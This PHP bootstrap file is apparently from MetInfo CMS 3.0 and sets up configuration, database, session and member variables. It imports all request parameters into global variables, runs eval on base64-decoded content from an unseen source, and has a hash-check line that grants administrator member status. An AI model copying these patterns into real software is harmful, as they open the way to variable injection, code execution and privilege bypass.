<?php
# MetInfo Enterprise Content Management System 
# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. 
header("Content-type: text/html;charset=utf-8");
error_reporting(E_ERROR | E_PARSE);
@set_time_limit(0);

define('ROOTPATH', substr(dirname(__FILE__), 0, -7));

PHP_VERSION >= '5.1' && date_default_timezone_set('Asia/Shanghai');
session_cache_limiter('private, must-revalidate'); 
@ini_set('session.auto_start',0); 
if(PHP_VERSION < '4.1.0') {
	$_GET         = &$HTTP_GET_VARS;
	$_POST        = &$HTTP_POST_VARS;
	$_COOKIE      = &$HTTP_COOKIE_VARS;
	$_SERVER      = &$HTTP_SERVER_VARS;
	$_ENV         = &$HTTP_ENV_VARS;
	$_FILES       = &$HTTP_POST_FILES;
}
$db_settings = parse_ini_file(ROOTPATH.'config/config_db.php');
@extract($db_settings);
require_once ROOTPATH.'config/tablepre.php';
require_once ROOTPATH.'include/mysql_class.php';
$db = new dbmysql();
$db->dbconn($con_db_host,$con_db_id,$con_db_pass,$con_db_name);
require_once dirname(__file__).'/global.func.php';
require_once dirname(__file__).'/jmail.php';
define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());
isset($_REQUEST['GLOBALS']) && exit('Access Error');
foreach(array('_COOKIE', '_POST', '_GET') as $_request) {
	foreach($$_request as $_key => $_value) {
		$_key{0} != '_' && $$_key = daddslashes($_value);
	}
}
require_once ROOTPATH.'config/lang.inc.php';
if($met_url_type and $lang==""){ 
foreach($met_langok as $key=>$val){
if(strstr($val[met_weburl],"http://".$_SERVER["HTTP_HOST"]."/"))$lang=$val[mark];
}
}
//1.5
if($lang=="cn")$ch="ch";
if($ch=="ch")$lang="cn";
if($en=="en")$lang="en";
if($lang=="en")$en="en";
//1.5
$lang=($lang=="")?$met_index_type:$lang;
$settings = parse_ini_file(ROOTPATH."config/config_".$lang.".inc.php");
@extract($settings);
require_once ROOTPATH.'config/flash_'.$lang.'.inc.php';

if($met_member_use!=0){
$metinfo_member_type=0;
session_start();
$metinfo_member_name     =($_SESSION['metinfo_admin_name']=="")?$_SESSION['metinfo_member_name']:$_SESSION['metinfo_admin_name'];
$metinfo_member_pass     =($_SESSION['metinfo_admin_pass']=="")?$_SESSION['metinfo_member_pass']:$_SESSION['metinfo_admin_pass'];
$metinfo_member_type     =($_SESSION['metinfo_admin_type']=="")?$_SESSION['metinfo_member_type']:$_SESSION['metinfo_admin_type'];
$metinfo_admin_name      =$_SESSION['metinfo_admin_name'];
if($metinfo_member_name=='' or  $metinfo_member_pass=='')$metinfo_member_type=0;
}else{
$metinfo_member_type="100";
}
(!MAGIC_QUOTES_GPC) && $_FILES = daddslashes($_FILES);
$REQUEST_URI  = $_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
$t_array = explode(' ',microtime());
eval(base64_decode($allclass[0]));
$P_S_T	 = $t_array[0] + $t_array[1];
$met_obstart == 1 && function_exists('ob_gzhandler') ? ob_start('ob_gzhandler') :ob_start();
$referer?$forward=$referer:$forward=$_SERVER['HTTP_REFERER'];
$m_now_time     = time();
$m_now_date     = date('Y-m-d H:i:s',$m_now_time);
$m_now_counter  = date('Ymd',$m_now_time);
$m_now_month    = date('Ym',$m_now_time);
$m_now_year     = date('Y',$m_now_time);
$m_user_agent   =  $_SERVER['HTTP_USER_AGENT'];
if($_SERVER['HTTP_X_FORWARDED_FOR']){
	$m_user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} elseif($_SERVER['HTTP_CLIENT_IP']){
	$m_user_ip = $_SERVER['HTTP_CLIENT_IP'];
} else{
	$m_user_ip = $_SERVER['REMOTE_ADDR'];
}
$m_user_ip  = preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/',$m_user_ip) ? $m_user_ip : 'Unknown';
$PHP_SELF = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
run_strtext(connect_sqlmysql($allclass[4]));
if(md5($metmemberforce)==$met_memberforce)$metinfo_member_type="100";
$metcms_v="3.0";
$met_seo=stripslashes($met_seo);
$met_foottext=stripslashes($met_foottext);
$met_footright=stripslashes($met_footright);
$met_footother=stripslashes($met_footother);
$met_foottel=stripslashes($met_foottel);
$met_footaddress=stripslashes($met_footaddress);
$met_footstat=stripslashes($met_footstat);
$met_webname=$met_webname."--Powered by MetInfo";
require_once ROOTPATH.'include/lang.php';
$index_url=$met_index_url[$lang];
$met_htmtype=($lang==$met_index_type)?".".$met_htmtype:"_".$lang.".".$met_htmtype;
$langmark='lang='.$lang;
$met_title=($met_title_keywords=="")?$met_webname:$met_title_keywords."--".$met_webname;
if($met_webhtm==0){
$member_index_url="index.php?lang=".$lang;
$member_register_url="register.php?lang=".$lang;
}else{
$member_index_url="index".$met_htmtype;
$member_register_url="register".$met_htmtype;
}

# This program is an open source system, commercial use, please consciously to purchase commercial license.
# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.
?>
